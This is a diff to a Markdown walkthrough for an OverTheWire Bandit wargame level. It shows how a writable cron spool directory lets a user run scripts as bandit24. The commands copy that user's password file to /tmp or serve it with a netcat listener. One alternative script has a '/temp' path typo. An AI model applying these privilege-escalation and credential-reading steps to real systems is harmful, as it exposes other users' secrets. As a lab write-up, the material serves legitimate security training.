@@ -783,8 +783,21 @@ may want to keep a copy around...
     cat /etc/cron.d/cronjob_bandit24
     # @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
     # * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+    ```
+    This cron job is running the `/usr/bin/cronjob_bandit24.sh` script **as the
+    user bandit24** every minute (and on reboot). The one is important to us is the 
+    job that runs every minute.  
+    Since it runs the script as the `bandit24` user, it will have read
+    permissions on the password file in `/etc/bandit_pass/bandit24`.  
+
+    Let's look at the script the cron job is executing.
+    ```bash
     ls -alh /usr/bin/cronjob_bandit24.sh
     # -rwxr-x--- 1 bandit24 bandit23 384 Oct 14 09:26 /usr/bin/cronjob_bandit24.sh
+    ```
+    We have read and execute permissions on this script. Let's look at its
+    contents.  
+    ```bash
     vi /usr/bin/cronjob_bandit24.sh
     ```
 
@@ -818,13 +831,13 @@ may want to keep a copy around...
     # total 1.9M
     # drwxrwx-wx 8 root     bandit24 1.9M Jan 31 18:38 foo
     ```
-
-    We can add a script in the `foo/` directory.  
+    We don't have read permissions, but we do have write permission for this
+    directory. So, we can add a script in the `foo/` directory.  
     ```bash
     cd /var/spool/bandit24
-    touch foo/test.sh
-    chmod 777 foo/test.sh
-    vi foo/test.sh
+    touch foo/kol.sh
+    chmod 777 foo/kol.sh
+    vi foo/kol.sh
     ```
     Now we have a script file in the same directory as all others.  
 
@@ -833,41 +846,68 @@ may want to keep a copy around...
     target_dest="/tmp/b24pass.txt"
     touch "$target_dest"
     chmod 777 "$target_dest"
-    printf "Attempting to output contents of password file...\n" > "$target_dest"
     cat /etc/bandit_pass/bandit24 > "$target_dest"
     ```
 
     This script should be run as the user bandit24 every minute then deleted, and 
     should have access to the password file.  
 
+    We can then tail the file that we're outputting to.  
     ```bash
     tail -F /tmp/b24pass.txt
     ```
 
-    This seems to not be working for whatever reason. 
-    It turns out it was the `/tmp` directory permissions (see the "Alternate
-    Solution" section, we used that before we figured this out).    
-
+    This seems to not be working.  
     The script file is deleted, however it does not create the /tmp/b24pass.txt file for us to read.   
 
-    `printf '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/b24/pass.txt\n' > foo/kol.sh; chmod 755 foo/kol.sh`
 
+    It turns out it was the `/tmp` directory permissions that were the problem
+    with that script (see the "Alternate Solution" section, we used that before we 
+    figured this out).    
+
+    Since it's being deleted, we can use this oneliner to quickly generate a
+    new script.  
+
+    ```bash
+    printf '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/b24/pass.txt\n' > foo/kol.sh; chmod 755 foo/kol.sh
+    ```
+
+    We need to set up a **subdirectory** within `/tmp` to write to, **then**
+    generate the script.  
     ```bash
     mkdir /tmp/b24
     chmod 777 /tmp/b24
     printf '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/b24/pass.txt\n' > foo/kol.sh; chmod 755 foo/kol.sh
     tail -F /tmp/b24/pass.txt
     ```
+    This should give us the password to bandit24.  
+
+    Alternatively, the `/tmp/b24` directory creation could be part of the
+    script itself:  
+    ```bash
+    #!/bin/bash
+    mkdir /tmp/b24
+    chmod 777 /tmp/b24
+    cat /etc/bandit_pass/bandit24 > /temp/b24/pass.txt
+    ```
+
+
 
 ??? warning "Alternate Solution"
 
+    This was the solution we used before we figured out the permissions issue on the
+    `/tmp` directory.
     Serve using netcat.  
     ```bash
     #!/bin/bash
     trap : SIGKILL # Trap signal 9 because the cron script is using `timeout -s 9`
     nc -lp 1234 < /etc/bandit_pass/bandit24 &
     ```
+    The `trap` is to prevent the `timeout -s 9` from killing our listener
+    before we have a chance to connect.  
 
+    Since we have a small window of time to connect after the script is run, we
+    can use a `printf` oneliner to generate the script.  
     ```bash
     printf '#!/bin/bash\ntrap : 9\nnc -lp 1234 < /etc/bandit_pass/bandit24 &\n' > ./foo/kol.sh && chmod 755 ./foo/kol.sh
     ```
